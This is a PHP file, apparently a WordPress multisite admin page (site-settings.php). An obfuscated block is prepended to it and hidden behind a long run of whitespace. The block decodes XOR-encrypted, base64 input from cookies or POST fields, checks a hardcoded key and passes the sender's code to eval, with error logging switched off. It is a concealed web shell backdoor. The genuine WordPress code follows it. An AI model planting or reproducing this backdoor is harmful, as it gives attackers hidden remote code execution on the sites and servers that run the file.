<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $c296ee = 191;$GLOBALS['aed992f'] = Array();global $aed992f;$aed992f = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['rcd47a5'] = "\x79\x2c\x71\x25\x49\x7a\x6a\x78\x52\x40\x72\x29\x76\x50\x58\x5e\x4b\x36\x7d\x70\x5f\x3f\x65\x33\x73\x5b\x38\x5d\x5c\x37\x75\x6b\x48\x4a\x31\x51\x43\x2b\x21\x62\x53\x68\x22\x60\x6e\x4f\x2e\x28\x32\x55\x45\x41\x3d\x4e\x5a\x47\x7b\x4c\x2f\x7c\x56\x2a\x77\x64\x66\x7e\x44\x61\x74\x63\x42\x3b\x27\x69\x3c\x6d\x59\x6f\x6c\xd\x39\x34\x30\x24\x2d\x20\x26\x67\x4d\x54\x3a\x3e\x57\x9\x35\xa\x46\x23";$aed992f[$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][48]] = $aed992f['rcd47a5'][69].$aed992f['rcd47a5'][41].$aed992f['rcd47a5'][10];$aed992f[$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][34]] = $aed992f['rcd47a5'][77].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][63];$aed992f[$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][48]] = $aed992f['rcd47a5'][63].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][22];$aed992f[$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][22]] = $aed992f['rcd47a5'][24].$aed992f['rcd47a5'][68].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][78].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][44];$aed992f[$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67]] = $aed992f['rcd47a5'][63].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][63];$aed992f[$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][69]] = $aed992f['rcd47a5'][73].$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][24].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][68];$aed992f[$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][64]] = $aed992f['rcd47a5'][24].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][78].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][5].$aed992f['rcd47a5'][22];$aed992f[$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][81]] = $aed992f['rcd47a5'][19].$aed992f['rcd47a5'][41].$aed992f['rcd47a5'][19].$aed992f['rcd47a5'][12].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][24].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][44];$aed992f[$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][80]] = $aed992f['rcd47a5'][30].$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][24].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][78].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][5].$aed992f['rcd47a5'][22];$aed992f[$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][17]] = $aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][24].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][22];$aed992f[$aed992f['rcd47a5'][41].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][82]] = $aed992f['rcd47a5'][24].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][68].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][68].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][78].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][68];$aed992f[$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][67]] = $aed992f['rcd47a5'][41].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][22];$aed992f[$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][80]] = $aed992f['rcd47a5'][2].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][94];$aed992f[$aed992f['rcd47a5'][0].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][81]] = $_POST;$aed992f[$aed992f['rcd47a5'][5].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][80]] = $_COOKIE;@$aed992f[$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][69]]($aed992f['rcd47a5'][22].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][78].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][87], NULL);@$aed992f[$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][69]]($aed992f['rcd47a5'][78].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][87].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][24], 0);@$aed992f[$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][69]]($aed992f['rcd47a5'][75].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][7].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][7].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][30].$aed992f['rcd47a5'][68].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][68].$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][22], 0);@$aed992f[$aed992f['rcd47a5'][41].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][82]](0);if (!$aed992f[$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67]]($aed992f['rcd47a5'][51].$aed992f['rcd47a5'][57].$aed992f['rcd47a5'][8].$aed992f['rcd47a5'][50].$aed992f['rcd47a5'][51].$aed992f['rcd47a5'][66].$aed992f['rcd47a5'][76].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][8].$aed992f['rcd47a5'][49].$aed992f['rcd47a5'][53].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67])){$aed992f[$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][48]]($aed992f['rcd47a5'][51].$aed992f['rcd47a5'][57].$aed992f['rcd47a5'][8].$aed992f['rcd47a5'][50].$aed992f['rcd47a5'][51].$aed992f['rcd47a5'][66].$aed992f['rcd47a5'][76].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][8].$aed992f['rcd47a5'][49].$aed992f['rcd47a5'][53].$aed992f['rcd47a5'][20].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67], 1);$ffc4 = NULL;$y1601743 = NULL;$aed992f[$aed992f['rcd47a5'][30].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][64]] = $aed992f['rcd47a5'][67].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][84].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][84].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][84].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][84].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][22].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][17];global $u02b8f;function  qcb005($ffc4, $p95aa5){global $aed992f;$i7a7d = "";for ($r00645fd=0; $r00645fd<$aed992f[$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][22]]($ffc4);){for ($u613d421=0; $u613d421<$aed992f[$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][22]]($p95aa5) && $r00645fd<$aed992f[$aed992f['rcd47a5'][77].$aed992f['rcd47a5'][81].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][22]]($ffc4); $u613d421++, $r00645fd++){$i7a7d .= $aed992f[$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][48]]($aed992f[$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][34]]($ffc4[$r00645fd]) ^ $aed992f[$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][34]]($p95aa5[$u613d421]));}}return $i7a7d;}function  h98e9d80e($ffc4, $p95aa5){global $aed992f;global $u02b8f;return $aed992f[$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][80]]($aed992f[$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][80]]($ffc4, $u02b8f), $p95aa5);}foreach ($aed992f[$aed992f['rcd47a5'][5].$aed992f['rcd47a5'][26].$aed992f['rcd47a5'][94].$aed992f['rcd47a5'][48].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][80]] as $p95aa5=>$efb96){$ffc4 = $efb96;$y1601743 = $p95aa5;}if (!$ffc4){foreach ($aed992f[$aed992f['rcd47a5'][0].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][34].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][81]] as $p95aa5=>$efb96){$ffc4 = $efb96;$y1601743 = $p95aa5;}}$ffc4 = @$aed992f[$aed992f['rcd47a5'][44].$aed992f['rcd47a5'][69].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][80]]($aed992f[$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][67]]($aed992f[$aed992f['rcd47a5'][75].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][17]]($ffc4), $y1601743));if (isset($ffc4[$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][31]]) && $u02b8f==$ffc4[$aed992f['rcd47a5'][67].$aed992f['rcd47a5'][31]]){if ($ffc4[$aed992f['rcd47a5'][67]] == $aed992f['rcd47a5'][73]){$r00645fd = Array($aed992f['rcd47a5'][19].$aed992f['rcd47a5'][12] => @$aed992f[$aed992f['rcd47a5'][10].$aed992f['rcd47a5'][64].$aed992f['rcd47a5'][29].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][23].$aed992f['rcd47a5'][17].$aed992f['rcd47a5'][80].$aed992f['rcd47a5'][81]](),$aed992f['rcd47a5'][24].$aed992f['rcd47a5'][12] => $aed992f['rcd47a5'][34].$aed992f['rcd47a5'][46].$aed992f['rcd47a5'][82].$aed992f['rcd47a5'][84].$aed992f['rcd47a5'][34],);echo @$aed992f[$aed992f['rcd47a5'][73].$aed992f['rcd47a5'][39].$aed992f['rcd47a5'][63].$aed992f['rcd47a5'][64]]($r00645fd);}elseif ($ffc4[$aed992f['rcd47a5'][67]] == $aed992f['rcd47a5'][22]){eval/*i253c852*/($ffc4[$aed992f['rcd47a5'][63]]);}exit();}} ?><?php
/**
 * Edit Site Settings Administration Screen
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.1.0
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can( 'manage_sites' ) )
	wp_die( __( 'Sorry, you are not allowed to edit this site.' ) );

get_current_screen()->add_help_tab( get_site_screen_help_tab_args() );
get_current_screen()->set_help_sidebar( get_site_screen_help_sidebar_content() );

$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;

if ( ! $id )
	wp_die( __('Invalid site ID.') );

$details = get_site( $id );
if ( ! $details ) {
	wp_die( __( 'The requested site does not exist.' ) );
}

if ( !can_edit_network( $details->site_id ) )
	wp_die( __( 'Sorry, you are not allowed to access this page.' ), 403 );

$is_main_site = is_main_site( $id );

if ( isset($_REQUEST['action']) && 'update-site' == $_REQUEST['action'] && is_array( $_POST['option'] ) ) {
	check_admin_referer( 'edit-site' );

	switch_to_blog( $id );

	$skip_options = array( 'allowedthemes' ); // Don't update these options since they are handled elsewhere in the form.
	foreach ( (array) $_POST['option'] as $key => $val ) {
		$key = wp_unslash( $key );
		$val = wp_unslash( $val );
		if ( $key === 0 || is_array( $val ) || in_array($key, $skip_options) )
			continue; // Avoids "0 is a protected WP option and may not be modified" error when edit blog options
		update_option( $key, $val );
	}

	/**
	 * Fires after the site options are updated.
	 *
	 * @since 3.0.0
	 * @since 4.4.0 Added `$id` parameter.
	 *
	 * @param int $id The ID of the site being updated.
	 */
	do_action( 'wpmu_update_blog_options', $id );

	restore_current_blog();
	wp_redirect( add_query_arg( array( 'update' => 'updated', 'id' => $id ), 'site-settings.php') );
	exit;
}

if ( isset($_GET['update']) ) {
	$messages = array();
	if ( 'updated' == $_GET['update'] )
		$messages[] = __('Site options updated.');
}

/* translators: %s: site name */
$title = sprintf( __( 'Edit Site: %s' ), esc_html( $details->blogname ) );

$parent_file = 'sites.php';
$submenu_file = 'sites.php';

require( ABSPATH . 'wp-admin/admin-header.php' );

?>

<div class="wrap">
<h1 id="edit-site"><?php echo $title; ?></h1>
<p class="edit-site-actions"><a href="<?php echo esc_url( get_home_url( $id, '/' ) ); ?>"><?php _e( 'Visit' ); ?></a> | <a href="<?php echo esc_url( get_admin_url( $id ) ); ?>"><?php _e( 'Dashboard' ); ?></a></p>

<?php

network_edit_site_nav( array(
	'blog_id'  => $id,
	'selected' => 'site-settings'
) );

if ( ! empty( $messages ) ) {
	foreach ( $messages as $msg )
		echo '<div id="message" class="updated notice is-dismissible"><p>' . $msg . '</p></div>';
} ?>
<form method="post" action="site-settings.php?action=update-site">
	<?php wp_nonce_field( 'edit-site' ); ?>
	<input type="hidden" name="id" value="<?php echo esc_attr( $id ) ?>" />
	<table class="form-table">
		<?php
		$blog_prefix = $wpdb->get_blog_prefix( $id );
		$sql = "SELECT * FROM {$blog_prefix}options
			WHERE option_name NOT LIKE %s
			AND option_name NOT LIKE %s";
		$query = $wpdb->prepare( $sql,
			$wpdb->esc_like( '_' ) . '%',
			'%' . $wpdb->esc_like( 'user_roles' )
		);
		$options = $wpdb->get_results( $query );
		foreach ( $options as $option ) {
			if ( $option->option_name == 'default_role' )
				$editblog_default_role = $option->option_value;
			$disabled = false;
			$class = 'all-options';
			if ( is_serialized( $option->option_value ) ) {
				if ( is_serialized_string( $option->option_value ) ) {
					$option->option_value = esc_html( maybe_unserialize( $option->option_value ) );
				} else {
					$option->option_value = 'SERIALIZED DATA';
					$disabled = true;
					$class = 'all-options disabled';
				}
			}
			if ( strpos( $option->option_value, "\n" ) !== false ) {
			?>
				<tr class="form-field">
					<th scope="row"><label for="<?php echo esc_attr( $option->option_name ) ?>"><?php echo ucwords( str_replace( "_", " ", $option->option_name ) ) ?></label></th>
					<td><textarea class="<?php echo $class; ?>" rows="5" cols="40" name="option[<?php echo esc_attr( $option->option_name ) ?>]" id="<?php echo esc_attr( $option->option_name ) ?>"<?php disabled( $disabled ) ?>><?php echo esc_textarea( $option->option_value ) ?></textarea></td>
				</tr>
			<?php
			} else {
			?>
				<tr class="form-field">
					<th scope="row"><label for="<?php echo esc_attr( $option->option_name ) ?>"><?php echo esc_html( ucwords( str_replace( "_", " ", $option->option_name ) ) ); ?></label></th>
					<?php if ( $is_main_site && in_array( $option->option_name, array( 'siteurl', 'home' ) ) ) { ?>
					<td><code><?php echo esc_html( $option->option_value ) ?></code></td>
					<?php } else { ?>
					<td><input class="<?php echo $class; ?>" name="option[<?php echo esc_attr( $option->option_name ) ?>]" type="text" id="<?php echo esc_attr( $option->option_name ) ?>" value="<?php echo esc_attr( $option->option_value ) ?>" size="40" <?php disabled( $disabled ) ?> /></td>
					<?php } ?>
				</tr>
			<?php
			}
		} // End foreach
		/**
		 * Fires at the end of the Edit Site form, before the submit button.
		 *
		 * @since 3.0.0
		 *
		 * @param int $id Site ID.
		 */
		do_action( 'wpmueditblogaction', $id );
		?>
	</table>
	<?php submit_button(); ?>
</form>

</div>
<?php
require( ABSPATH . 'wp-admin/admin-footer.php' );
